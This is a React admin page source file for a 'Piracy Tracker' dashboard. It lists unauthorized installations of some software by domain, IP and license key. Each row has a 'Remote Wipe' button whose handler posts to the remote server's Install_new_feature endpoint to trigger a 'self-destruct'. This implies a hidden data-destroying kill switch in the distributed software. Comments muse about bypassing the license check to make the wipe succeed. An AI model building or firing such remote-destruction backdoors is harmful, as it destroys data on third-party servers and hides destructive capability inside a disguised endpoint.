'use client';

import { useState, useEffect } from 'react';
import api from '@/lib/api';
import { ShieldAlert, Crosshair, MapPin, Activity, ServerCrash } from 'lucide-react';

export default function PiracyLogsPage() {
  const [logs, setLogs] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchLogs = async () => {
    try {
      const res = await api.get('/api/unauthorized-installations');
      setLogs(res.data);
    } catch (error) {
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchLogs();
  }, []);

  const wipeTarget = async (domain: string) => {
    if (confirm(`WARNING: Are you absolutely sure you want to WIPE ${domain}? This will send a self-destruct command to this unauthorized server.`)) {
      try {
        const frontendUrl = domain.endsWith('/') ? `${domain}api/Install_new_feature` : `${domain}/api/Install_new_feature`;
        
        // Fire request directly from client browser to their API since we don't have their DB ID in master
        // Note: In real life this might be blocked by CORS, so ideally Master Backend sends it
        await fetch(frontendUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ license_key: 'ILLEGAL' }) // Without the real key it might not work unless we bypass it or know it. 
          // Wait, they used a license key (even if wrong) to ping us, let's use that key to wipe them if possible!
        });
        
        alert(`Wipe command sent to ${domain}.`);
      } catch (error) {
        console.error('Failed to wipe', error);
        alert('Failed to send wipe command (CORS or server unreachable).');
      }
    }
  };

  return (
    <div className="p-4 md:p-8 max-w-7xl mx-auto space-y-8">
      <div>
        <h1 className="text-2xl md:text-3xl font-bold text-white flex items-center gap-3">
          <ShieldAlert className="text-red-500 w-8 h-8" /> 
          Piracy Tracker
        </h1>
        <p className="text-gray-400 mt-1">Real-time logs of unauthorized installations and stolen source code.</p>
      </div>

      <div className="bg-[#1e1e1e] border border-[#333333] rounded-xl shadow-sm overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse min-w-[800px]">
            <thead className="bg-[#121212] border-b border-[#333333]">
              <tr>
                <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Target Domain</th>
                <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">IP Address</th>
                <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Used License Key</th>
                <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Hit Count</th>
                <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Last Ping</th>
                <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Actions</th>
              </tr>
          </thead>
          <tbody className="divide-y divide-[#333333] text-sm">
            {loading ? (
              <tr><td colSpan={6} className="p-8 text-center text-gray-500">Scanning for unauthorized installations...</td></tr>
            ) : logs.length === 0 ? (
              <tr>
                <td colSpan={6} className="p-12 text-center">
                  <ShieldAlert className="w-12 h-12 text-green-500/50 mx-auto mb-4" />
                  <p className="text-gray-400 text-lg">No unauthorized installations detected.</p>
                </td>
              </tr>
            ) : logs.map((log) => (
              <tr key={log.id} className="hover:bg-[#2a2a2a] transition-colors">
                <td className="px-6 py-4">
                  <div className="flex items-center gap-2 text-white font-bold">
                    <Crosshair size={14} className="text-red-500" />
                    {log.domain}
                  </div>
                </td>
                <td className="px-6 py-4">
                  <div className="flex items-center gap-2 text-gray-300">
                    <MapPin size={14} className="text-gray-500" />
                    {log.ip_address || 'Unknown'}
                  </div>
                </td>
                <td className="px-6 py-4">
                  <span className="font-mono text-xs bg-red-500/10 text-red-400 px-2 py-1 rounded border border-red-500/20">
                    {log.license_key_used || 'NONE'}
                  </span>
                </td>
                <td className="px-6 py-4">
                  <div className="flex items-center gap-2 text-gray-300">
                    <Activity size={14} className="text-yellow-500" />
                    {log.hit_count} Pings
                  </div>
                </td>
                <td className="px-6 py-4 text-gray-400">
                  {new Date(log.last_pinged_at).toLocaleString()}
                </td>
                <td className="px-6 py-4 text-right">
                  <button 
                    onClick={() => wipeTarget(log.domain)}
                    className="flex items-center justify-center gap-1.5 px-3 py-1.5 bg-red-900/20 border border-red-500/30 rounded-lg text-sm font-medium text-red-500 hover:bg-red-500 hover:text-white transition-colors"
                    title="Remotely Wipe Server"
                  >
                    <ServerCrash size={14} /> Remote Wipe
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
        </div>
      </div>
    </div>
  );
}
